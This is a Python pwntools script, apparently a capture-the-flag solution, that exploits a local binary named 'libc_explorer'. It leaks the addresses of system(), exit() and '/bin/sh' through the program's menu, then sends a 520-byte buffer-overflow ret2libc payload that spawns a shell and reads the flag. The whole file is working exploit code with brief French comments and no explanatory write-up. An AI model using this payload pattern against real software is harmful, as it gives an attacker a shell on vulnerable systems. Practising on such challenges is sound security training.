from pwn import p32, process, log


def get_libc_functions(io) -> tuple[int, int]:
    # Obtenir l'adresse de system()
    io.sendlineafter(b"Please select an option: ", b"1")
    io.sendlineafter(b"Enter the symbol name to search:", b"system")
    io.recvuntil(b"address: ")
    system_addr = int(io.recvline().strip(), 16)

    # Obtenir l'adresse de exit()
    io.sendline(b"1")
    io.sendlineafter(b"Enter the symbol name to search:", b"exit")
    io.recvuntil(b"address:")
    exit_addr = int(io.recvline().strip(), 16)

    return system_addr, exit_addr


def get_bin_sh_addr(io) -> int:
    # On cherche la chaîne "/bin/sh" dans libc
    io.sendline(b"2")
    io.sendlineafter(b"Enter the string to search:", b"/bin/sh")
    io.recvuntil(b"address:")
    bin_sh_addr = int(io.recvline().strip(), 16)
    return bin_sh_addr


def buffer_overflow_ret2libc(binary_path: str, offset: int = 520) -> str:
    io = process(binary_path)

    system_addr, exit_addr = get_libc_functions(io)
    bin_sh_addr = get_bin_sh_addr(io)
    # Affichage des adresses
    log.info(f"system() = {hex(system_addr)}")
    log.info(f"exit()   = {hex(exit_addr)}")
    log.info(f"/bin/sh  = {hex(bin_sh_addr)}")

    # Création du payload
    payload = b"A" * offset
    payload += p32(system_addr)
    payload += p32(exit_addr)  # Adresse de retour pour system() -> exit()
    payload += p32(bin_sh_addr)  # Argument pour system()

    # Envoie le choix de menu et le payload
    io.sendline(b"1")
    io.recvuntil(b"Enter the symbol name to search: ")
    io.sendline(payload)
    # Envoie la commande dans le shell
    io.sendline(b"cat flag")
    flag = io.recvall(timeout=2).decode().splitlines()[-1]
    return flag


if __name__ == "__main__":
    binary_path = "./libc_explorer"
    # Offset obtenu avec gdb et la commande cyclic -l
    flag = buffer_overflow_ret2libc(binary_path, offset=520)
    print(f"Flag: {flag}")
